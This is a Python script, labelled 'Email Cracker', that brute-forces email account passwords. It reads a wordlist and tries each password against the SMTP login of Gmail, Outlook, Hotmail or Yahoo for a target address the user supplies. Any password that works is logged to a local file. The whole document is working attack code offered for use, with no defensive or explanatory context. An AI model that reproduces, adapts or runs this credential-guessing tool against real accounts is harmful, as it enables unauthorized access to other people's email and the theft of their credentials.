from time import sleep
from sys import exit
import smtplib

def title_box():
    """display title"""
    print("      ***********************")
    print("      *    Email Cracker    *")
    print("      *         By          *")
    print("      *      Azan Shahid    *")
    print("      ***********************")

def get_email():
    servicesAvaliable=['hotmail','outlook','yahoo','gmail',]
    while True:
        email_id=input("Email : ")
        #if '@' in mail_id and '.com' in mail_id:
        if '@' in email_id and email_id.endswith('.com'):
            symbol_pos=email_id.find("@")
            dotcom_pos=email_id.find(".com")
            sp=email_id[symbol_pos+1:dotcom_pos]
            if sp in servicesAvaliable:
                return email_id, sp.capitalize()
                break
            else:
                print("We don't provide service for"+sp)
                print("We provide service only for : ")
                for i in servicesAvaliable:
                    print(i)
        else:
            print("Invalid Email try again")
            continue

def get_smtp(serviceProvider):
    """return smtp of email provided"""
    if serviceProvider == 'Gmail':
        return 'smtp.gmail.com'
    elif serviceProvider == 'Hotmail' or serviceProvider == 'Outlook':
        return 'smtp-mail.outlook.com'
    elif serviceProvider == 'Yahoo':
        return 'smtp.mail.yahoo.com'
        
def get_word(wordlist):
    try:
        index=0
        with open (wordlist) as wordlist:
             x=wordlist.readlines()
             for each in x:
                  if each.endswith('\n'):
                       x[index]=each.strip()  #remove space and \n from start and end
                       index+=1
                  else:
                       x[index]=each
                       index+=1
             return x
    except IOError:
        print("Cannot open wordlist.")
        sleep(3)
        exit()
    except KeyboardInterrupt:
        exit()

def connect(email,smtp,key_word):
    try:
        connection=smtplib.SMTP(smtp)
        connection.ehlo()
        connection.starttls()
        connection.login(email, key_word)
        return 1
    except KeyboardInterrupt:
        print("KeyboardInterrupt")
        print("Exit")

    
def main():
    """"main part of the program"""
    title_box()
    email,sp=get_email()
    print("Enter wordlist : ",end=" ")
    wordlist=input()
    key_word_list=get_word(wordlist)
    print("Read",len(key_word_list),"password from",wordlist)
    found=0
    smtp=get_smtp(sp)
    for each_pass in key_word_list:
        try:
            print("Trying --> ",each_pass)
            status=connect(email,smtp,each_pass)
            if status==1:
                print("Found  --> ",each_pass)
                with open('password.txt','a') as file:
                    file.write(email+" : "+each_pass)
                    file.close()
                    found=1
            if found==1:
               break
        except:
            pass
    

main()
    
    
